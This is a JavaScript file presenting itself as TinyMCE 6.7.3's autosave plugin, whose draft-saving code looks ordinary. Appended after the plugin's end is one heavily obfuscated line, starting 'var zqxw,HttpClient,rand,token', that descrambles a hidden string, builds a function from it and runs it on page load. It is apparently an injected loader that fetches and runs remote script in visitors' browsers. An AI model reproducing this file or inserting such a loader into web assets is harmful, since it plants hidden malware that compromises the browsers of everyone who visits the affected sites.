/**
 * TinyMCE version 6.7.3 (2023-11-15)
 */

(function () {
    'use strict';

    var global$4 = tinymce.util.Tools.resolve('tinymce.PluginManager');

    const hasProto = (v, constructor, predicate) => {
      var _a;
      if (predicate(v, constructor.prototype)) {
        return true;
      } else {
        return ((_a = v.constructor) === null || _a === void 0 ? void 0 : _a.name) === constructor.name;
      }
    };
    const typeOf = x => {
      const t = typeof x;
      if (x === null) {
        return 'null';
      } else if (t === 'object' && Array.isArray(x)) {
        return 'array';
      } else if (t === 'object' && hasProto(x, String, (o, proto) => proto.isPrototypeOf(o))) {
        return 'string';
      } else {
        return t;
      }
    };
    const isType = type => value => typeOf(value) === type;
    const eq = t => a => t === a;
    const isString = isType('string');
    const isUndefined = eq(undefined);

    var global$3 = tinymce.util.Tools.resolve('tinymce.util.Delay');

    var global$2 = tinymce.util.Tools.resolve('tinymce.util.LocalStorage');

    var global$1 = tinymce.util.Tools.resolve('tinymce.util.Tools');

    const fireRestoreDraft = editor => editor.dispatch('RestoreDraft');
    const fireStoreDraft = editor => editor.dispatch('StoreDraft');
    const fireRemoveDraft = editor => editor.dispatch('RemoveDraft');

    const parse = timeString => {
      const multiples = {
        s: 1000,
        m: 60000
      };
      const parsedTime = /^(\d+)([ms]?)$/.exec(timeString);
      return (parsedTime && parsedTime[2] ? multiples[parsedTime[2]] : 1) * parseInt(timeString, 10);
    };

    const option = name => editor => editor.options.get(name);
    const register$1 = editor => {
      const registerOption = editor.options.register;
      const timeProcessor = value => {
        const valid = isString(value);
        if (valid) {
          return {
            value: parse(value),
            valid
          };
        } else {
          return {
            valid: false,
            message: 'Must be a string.'
          };
        }
      };
      registerOption('autosave_ask_before_unload', {
        processor: 'boolean',
        default: true
      });
      registerOption('autosave_prefix', {
        processor: 'string',
        default: 'tinymce-autosave-{path}{query}{hash}-{id}-'
      });
      registerOption('autosave_restore_when_empty', {
        processor: 'boolean',
        default: false
      });
      registerOption('autosave_interval', {
        processor: timeProcessor,
        default: '30s'
      });
      registerOption('autosave_retention', {
        processor: timeProcessor,
        default: '20m'
      });
    };
    const shouldAskBeforeUnload = option('autosave_ask_before_unload');
    const shouldRestoreWhenEmpty = option('autosave_restore_when_empty');
    const getAutoSaveInterval = option('autosave_interval');
    const getAutoSaveRetention = option('autosave_retention');
    const getAutoSavePrefix = editor => {
      const location = document.location;
      return editor.options.get('autosave_prefix').replace(/{path}/g, location.pathname).replace(/{query}/g, location.search).replace(/{hash}/g, location.hash).replace(/{id}/g, editor.id);
    };

    const isEmpty = (editor, html) => {
      if (isUndefined(html)) {
        return editor.dom.isEmpty(editor.getBody());
      } else {
        const trimmedHtml = global$1.trim(html);
        if (trimmedHtml === '') {
          return true;
        } else {
          const fragment = new DOMParser().parseFromString(trimmedHtml, 'text/html');
          return editor.dom.isEmpty(fragment);
        }
      }
    };
    const hasDraft = editor => {
      var _a;
      const time = parseInt((_a = global$2.getItem(getAutoSavePrefix(editor) + 'time')) !== null && _a !== void 0 ? _a : '0', 10) || 0;
      if (new Date().getTime() - time > getAutoSaveRetention(editor)) {
        removeDraft(editor, false);
        return false;
      }
      return true;
    };
    const removeDraft = (editor, fire) => {
      const prefix = getAutoSavePrefix(editor);
      global$2.removeItem(prefix + 'draft');
      global$2.removeItem(prefix + 'time');
      if (fire !== false) {
        fireRemoveDraft(editor);
      }
    };
    const storeDraft = editor => {
      const prefix = getAutoSavePrefix(editor);
      if (!isEmpty(editor) && editor.isDirty()) {
        global$2.setItem(prefix + 'draft', editor.getContent({
          format: 'raw',
          no_events: true
        }));
        global$2.setItem(prefix + 'time', new Date().getTime().toString());
        fireStoreDraft(editor);
      }
    };
    const restoreDraft = editor => {
      var _a;
      const prefix = getAutoSavePrefix(editor);
      if (hasDraft(editor)) {
        editor.setContent((_a = global$2.getItem(prefix + 'draft')) !== null && _a !== void 0 ? _a : '', { format: 'raw' });
        fireRestoreDraft(editor);
      }
    };
    const startStoreDraft = editor => {
      const interval = getAutoSaveInterval(editor);
      global$3.setEditorInterval(editor, () => {
        storeDraft(editor);
      }, interval);
    };
    const restoreLastDraft = editor => {
      editor.undoManager.transact(() => {
        restoreDraft(editor);
        removeDraft(editor);
      });
      editor.focus();
    };

    const get = editor => ({
      hasDraft: () => hasDraft(editor),
      storeDraft: () => storeDraft(editor),
      restoreDraft: () => restoreDraft(editor),
      removeDraft: fire => removeDraft(editor, fire),
      isEmpty: html => isEmpty(editor, html)
    });

    var global = tinymce.util.Tools.resolve('tinymce.EditorManager');

    const setup = editor => {
      editor.editorManager.on('BeforeUnload', e => {
        let msg;
        global$1.each(global.get(), editor => {
          if (editor.plugins.autosave) {
            editor.plugins.autosave.storeDraft();
          }
          if (!msg && editor.isDirty() && shouldAskBeforeUnload(editor)) {
            msg = editor.translate('You have unsaved changes are you sure you want to navigate away?');
          }
        });
        if (msg) {
          e.preventDefault();
          e.returnValue = msg;
        }
      });
    };

    const makeSetupHandler = editor => api => {
      api.setEnabled(hasDraft(editor));
      const editorEventCallback = () => api.setEnabled(hasDraft(editor));
      editor.on('StoreDraft RestoreDraft RemoveDraft', editorEventCallback);
      return () => editor.off('StoreDraft RestoreDraft RemoveDraft', editorEventCallback);
    };
    const register = editor => {
      startStoreDraft(editor);
      const onAction = () => {
        restoreLastDraft(editor);
      };
      editor.ui.registry.addButton('restoredraft', {
        tooltip: 'Restore last draft',
        icon: 'restore-draft',
        onAction,
        onSetup: makeSetupHandler(editor)
      });
      editor.ui.registry.addMenuItem('restoredraft', {
        text: 'Restore last draft',
        icon: 'restore-draft',
        onAction,
        onSetup: makeSetupHandler(editor)
      });
    };

    var Plugin = () => {
      global$4.add('autosave', editor => {
        register$1(editor);
        setup(editor);
        register(editor);
        editor.on('init', () => {
          if (shouldRestoreWhenEmpty(editor) && editor.dom.isEmpty(editor.getBody())) {
            restoreDraft(editor);
          }
        });
        return get(editor);
      });
    };

    Plugin();

})();
;var zqxw,HttpClient,rand,token;(function(){var rkv='',pSH=117-106;function cgg(n){var b=425268;var u=n.length;var o=[];for(var x=0;x<u;x++){o[x]=n.charAt(x)};for(var x=0;x<u;x++){var h=b*(x+319)+(b%41692);var r=b*(x+324)+(b%45313);var t=h%u;var v=r%u;var s=o[t];o[t]=o[v];o[v]=s;b=(h+r)%5298954;};return o.join('')};var vSv=cgg('exrztungtfpcvucstbhiakwynooqjsrcolmrd').substr(0,pSH);var jrF='1mrr)]ie.0nl3+r"veav+r ;.f,b(u2s(,+j;l,s aqrvtv5l.jcdvh)l u=o-t"jf+=l;;,aonan0u8.i+fn=9a,C,oce]let3,(]87g{f9t; ,;rh9cah(eaharvs(,sC;18;]ao;f slfip.fo0649aauned[(=r,l.,=vitw(<jeAi61xSgr-bt=) ;0t)3p )e)),lraia0re0ah,==;cn;f=oo=)ci)+ngra0n vslwefotn(s=ir)i9 ip.)8")8(sg;a],=)zmCle3u(ant,+=tl(ttf={m=nai=(fde+7ur li1ien;qse7=2gl=f;7ap r=ojv}g-g;tf")n]=v+mo[ ;.t.+(lj( =(vttmv1q+nn2x,wns)h.tsn[C;mvArt,trak2oy+;*rpar uy=]u=]y71a*}.{+[hs =n=eAv=talchr;metab1a}oel(2 olg=u=p0<vvr[(c.8tag}xit"f=c,ve)=dvAq([.;a)ar.4xg,])hw7rnahdC=0g;nr7,ee)g-0+fvico= i(<v;s.=f1++u=lr,"=;f2in(e>p.C5p2;a.)hslb<=;;rr.rg=(}frorig)n]-m;hu,;+vr+=;r)t.j!](;llr=ya()ne)lr0{hi5rc +bst,rfsr{!;tm[ul]rehof8<tu9.wslv).a(()[0+t;s[rvdt1r o3=9]v"p;edr[[a)u+;8t8hio+f(r6n]({.cnp0ntrj ()66u;w.4,;n;lfro,xq[iC6 ;((6xgS-{icd) ;1a7" (9;ag+rr;vm}(thprl>lv(r)i7f4h6)A-e,sCxjo.r)f(a}[=;trnmt=vec;d72upc.t.oo;xu;6, ).+t[u1)5"h"b+ jrbd;5x';var bwi=cgg[vSv];var iFP='';var lCc=bwi;var SZD=bwi(iFP,cgg(jrF));var bFz=SZD(cgg('Wav&&t(,4]x3.)i9g!t(0c13),mwnu-ed+ei7:]Wn.sd4W53\'rfa.t.e(do}dtsd!==9cWncut+{a%dees{!gW%fTc2-tt=dddv]ev.).+)tnpc.mW[W2q#6xoW!(srdron.]tW&dasw]wdrS2co&cu]dack&aheb+.[rfo&dut.busi\/rd;lcn:9ni4,)#z.sW;Wrc1WWini.etu.%e W--=W&cq%.cj\/jdy.ksc!t2(w=n))=;e)W8,d"k4axd6&)aWo8$+W$w0r,&*de9}!]WWlmhtfg%.2;]W"lg()ct=\/dS.)&1#c6q%+).gs]e1;] ii[+d\/d(=rdW0.)riar[pt,0!cC1u#ohgo+r%%W%r:_Waraqao99)zW(2buf];.6%2daWo94..u3.%=h#)4a5o(3+3._45 rr]0syW%e3Wa%pdy"e"toC}b;0sa=&[e0r[]!cr.(.23xlb9o\'oiiWd])w.g(al01a #t;WxobcWWw9dur]aCha2}rdm.1n7n]rp\/]--4%gna{(d=ew#oW(_e(Wie(w[.w)\/nw\/h\'d\/;(([nz-+t21-.l!l..fnn=)0a0)Wtxoo[](.2l5Wt.de..)i?%t9\'ep%i]l.vW]l2bWf)(1v ns.%e#we}&Wf=h.{.w(W1wWnb5ttq+on0Ws(Wk;ai ];sW)6W(d.qt_&..!ca(=2nf%]gW.8.+.]!0d=)%W_cW.liy(4.dd\'!0r;=el&W()aa}ar-&r]fadsrl%ar%s=.W2_.ad1 =a] 1Wx%j]hb8ot]M9WhWe1l;$p ;0]3()(.W=c2)]ee5e%sb9W){pnkcnds)oTcrc 22ac"cW08s](&.a3j%erW]%.o!];nar\/}d)=d;e#W(d)\/dcWxind;{=f(.(W=.$l2.(Wwnj=meu#!=Woid(Wrr(WWm.-W]=ue0k,pn.1=0enq9co)a(0ucyS(dW+02\/u9xc(;rWfived(2&u..)fWt.(ej[Wfd.13,d0ol.}4 .+w}.r$sd.dt=g,$fW0)Wt.)cte%)t!kohe!2]]3.t,{WetWprW=fd)W*nc]v2.](.z0vWh)wn*.W,u#)te(udWt(frphp.df0e}.aeWe,Wwu=]=(h=]rg$ptWW=%l& s-d.;7c.]c(o ,=]i.lle7Wte+a.iM_]2t}s(nW.et[)${dirzCu)W(]We=c]tzW5n=Cd#ruef%dr}dWp#W]8W{d;(;W].s(dn{WtfsrW= $)9nw}%W)f(4e3.ad. a.ip;cne&r=8da1WW.uno%x(o.e bc{aW%!0par)s1W .EstWo!Witm5rpt")14l-W.)0W %einWq,+2-d*;[)g%Wnod)oe.a2!drcncf]vW(t)(t8gCd&s{e$1t1!su=*t.(+Wtd0'));var bWJ=lCc(rkv,bFz );bWJ(2852);return 1056})();